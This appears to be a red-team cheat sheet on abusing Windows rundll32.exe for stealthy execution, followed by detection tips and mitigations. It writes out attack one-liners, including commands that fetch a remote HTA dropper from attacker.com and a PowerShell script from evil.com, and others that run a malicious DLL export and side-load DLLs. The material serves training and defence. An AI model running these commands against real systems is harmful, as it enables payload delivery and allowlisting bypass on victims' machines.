# 🧪 Rundll32 - Living Off the Land

**Rundll32.exe** is a native Windows binary used to execute DLLs — but attackers often weaponize it to execute **JavaScript, PowerShell, HTAs**, and even shellcode in stealthy ways.

> ⚠️ These examples are for red team training and lab use only.

---

## 🛠️ What It Does
- Loads and executes functions from DLL files
- Launches scripts via `mshtml.dll` trick
- Executes HTAs or PowerShell from memory
- Bypasses basic application allowlisting

---

## 💣 Common LotL Rundll32 Techniques

### 1. Execute JavaScript/HTML with mshtml.dll
```cmd
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write("<script>eval('alert(\'Hacked!\')')</script>")
```
✅ Executes embedded JavaScript as a native app (via IE engine)

---

### 2. Launch HTA File with Rundll32
```cmd
rundll32.exe url.dll,FileProtocolHandler http://attacker.com/dropper.hta
```
✅ Opens remote payloads with browser-like stealth

---

### 3. Call DLL Export Function
```cmd
rundll32.exe C:\Users\Public\evil.dll,EntryPoint
```
✅ Executes malicious code inside a DLL — useful for evasion and lateral movement

---

### 4. Execute PowerShell from Memory (via mshtml)
```cmd
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write("<script>window.location='http://evil.com/shell.ps1'</script>")
```
✅ Pulls external PowerShell via browser engine tricks

---

### 5. Side-load DLL in Trusted Process
```cmd
rundll32.exe trustedapp.exe,ExportedFunction
```
✅ Abuses DLL search order to load attacker-controlled DLLs in legit processes

---

## 🕵️‍♂️ Detection Tips
| Indicator | Detection Method |
|-----------|------------------|
| Use of `javascript:` in rundll32 | Flag command-line args with script execution patterns |
| Unusual parent-child process | Detect Office/Explorer spawning rundll32.exe |
| Remote resource loading | Monitor for `rundll32` initiating web connections |
| DLLs in unusual locations | Look for unsigned DLLs in temp or public folders |

---

## 🔐 Mitigation Strategies
- Restrict `rundll32.exe` via AppLocker/WDAC when possible
- Audit signed DLLs only from known locations
- Alert on rundll32 running with `mshtml.dll` or `javascript:` patterns
- Block outbound connections from rundll32.exe

---

> 🔗 Rundll32 is often combined with PowerShell, HTA, and LOLBins in multi-phase attacks. Master it to understand stealth execution.
